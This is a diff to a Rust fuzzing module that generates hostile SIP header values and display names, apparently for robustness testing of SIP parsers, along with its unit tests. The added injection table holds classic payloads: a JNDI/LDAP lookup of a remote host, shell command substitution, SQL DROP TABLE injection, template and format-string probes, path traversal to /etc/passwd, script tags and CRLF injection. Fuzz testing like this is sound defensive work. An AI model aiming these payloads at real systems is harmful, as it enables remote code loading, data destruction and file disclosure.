@@ -10,9 +10,62 @@ use crate::Rng;
 /// (RFC 3261 §8.2.2.3).
 pub const UNKNOWN_EXTENSION: &str = "x-nonexistent";
 
-/// One hostile header: (name, value, label).
-pub fn header(rng: &mut Rng) -> (String, String, &'static str) {
-    let pick = rng.below(16);
+/// Text shaped to break whatever reads a field downstream: an interpreter, a
+/// query, a template, a log or a path. Every one is legal `TEXT-UTF8` and
+/// `qdtext` once quoted: (value, label).
+const INJECTIONS: &[(&str, &str)] = &[
+    ("${jndi:ldap://192.0.2.1:1389/a}", "jndi"),
+    ("${env:HOME}${sys:user.name}", "lookup"),
+    ("$(id) `id` ;id; |id", "shell"),
+    ("'; DROP TABLE calls;-- \" OR \"1\"=\"1", "sql"),
+    ("\"},{\"injected\":true,\"x\":\"", "json"),
+    ("{{7*7}} #{7*7} <%= 7*7 %> ${7*7}", "template"),
+    ("%s%n%x%p %d%%", "format"),
+    ("../../../etc/passwd ..\\..\\win.ini", "path"),
+    ("<script>alert(1)</script><img src=x>", "markup"),
+    ("%0d%0aX-Injected: 1%0d%0a", "escaped-crlf"),
+    ("\\\"\\\\\\' \\x00 \\u0000", "backslashes"),
+    ("Zoë Ñandú — 東京 مرحبا שלום 😀", "utf8"),
+    ("\u{202E}gnp.exe\u{202C} \u{200B}a\u{200D}b\u{FEFF}", "bidi-zero-width"),
+];
+
+/// One injection-shaped text: (value, label).
+pub fn injection(rng: &mut Rng) -> (String, &'static str) {
+    let (value, label) = *rng.pick(INJECTIONS);
+    (value.to_string(), label)
+}
+
+/// One display name, raw (the writer quotes it): an injection, a long one,
+/// or with `all_chars` half the time every character a quoted string takes
+/// ([`chars::quoted`](crate::chars::quoted)).
+pub fn display(rng: &mut Rng, all_chars: bool) -> (String, &'static str) {
+    if all_chars && rng.chance(50) {
+        return (crate::chars::quoted(rng), "all-chars");
+    }
+    match rng.below(8) {
+        0 => ("é".repeat(50 + rng.below(200) as usize), "long-utf8"),
+        _ => injection(rng),
+    }
+}
+
+/// One free-text header value: an injection, or with `all_chars` half the
+/// time every `TEXT-UTF8char` ([`chars::text`](crate::chars::text)).
+pub fn text(rng: &mut Rng, all_chars: bool) -> (String, &'static str) {
+    if all_chars && rng.chance(50) {
+        return (crate::chars::text(rng), "all-chars");
+    }
+    injection(rng)
+}
+
+/// One hostile header: (name, value, label). With `all_chars`, one draw in
+/// two is an extension header whose name holds every `token` character and
+/// whose value every `TEXT-UTF8char`.
+pub fn header(rng: &mut Rng, all_chars: bool) -> (String, String, &'static str) {
+    if all_chars && rng.chance(50) {
+        let name = format!("X-Fz-{}", crate::chars::token(rng));
+        return (name, crate::chars::text(rng), "all-chars");
+    }
+    let pick = rng.below(17);
     let (name, value, label): (&str, String, &str) = match pick {
         0 => ("X-Fuzz-Emoji", "😀🎉 👨‍👩‍👧‍👦 🇫🇷 🏳️‍🌈".into(), "emoji"),
         1 => ("Subject", "Zoë Ñandú — 東京 مرحبا שלום".into(), "subject-utf8"),
@@ -37,6 +90,7 @@ pub fn header(rng: &mut Rng) -> (String, String, &'static str) {
         12 => ("X-Fuzz-Lws", "a    b\t\tc   ".into(), "lws"),
         13 => ("X-Fuzz-Huge", "ü".repeat(600 + rng.below(1200) as usize), "huge"),
         14 => ("X-Fuzz-Percent", "%00%0D%0A%FF%C3%28 %%%".into(), "percent"),
+        15 => ("X-Fuzz-Inject", injection(rng).0, "injection"),
         _ => ("X-Fuzz-Ascii-Edge", "!#$%&'*+-.^_`|~ {}[]\\/?=@:".into(), "ascii-edge"),
     };
     (name.to_string(), value, label)
@@ -104,11 +158,27 @@ mod tests {
     #[test]
     fn header_values_hold_no_control_character() {
         let mut rng = Rng::new(5);
-        for _ in 0..2000 {
-            let (name, value, _) = header(&mut rng);
-            assert!(name.bytes().all(|b| b.is_ascii_graphic()), "{name}");
-            assert!(!value.chars().any(|c| matches!(c, '\r' | '\n' | '\0')), "{name}: {value:?}");
+        for all_chars in [false, true] {
+            for _ in 0..2000 {
+                let (name, value, _) = header(&mut rng, all_chars);
+                assert!(name.bytes().all(|b| b.is_ascii_graphic() && b != b':'), "{name}");
+                assert!(!value.contains(['\r', '\n', '\0']), "{name}: {value:?}");
+                let (value, _) = text(&mut rng, all_chars);
+                assert!(!value.contains(['\r', '\n', '\0']), "{value:?}");
+                let (display, _) = display(&mut rng, all_chars);
+                assert!(!display.contains(['\r', '\n', '\0']), "{display:?}");
+            }
         }
+    }
+
+    #[test]
+    fn all_chars_draws_its_values_only_when_asked() {
+        let labels = |all_chars| {
+            let mut rng = Rng::new(6);
+            (0..500).map(|_| header(&mut rng, all_chars).2).collect::<Vec<_>>()
+        };
+        assert!(!labels(false).contains(&"all-chars"));
+        assert!(labels(true).contains(&"all-chars"));
     }
 
     #[test]
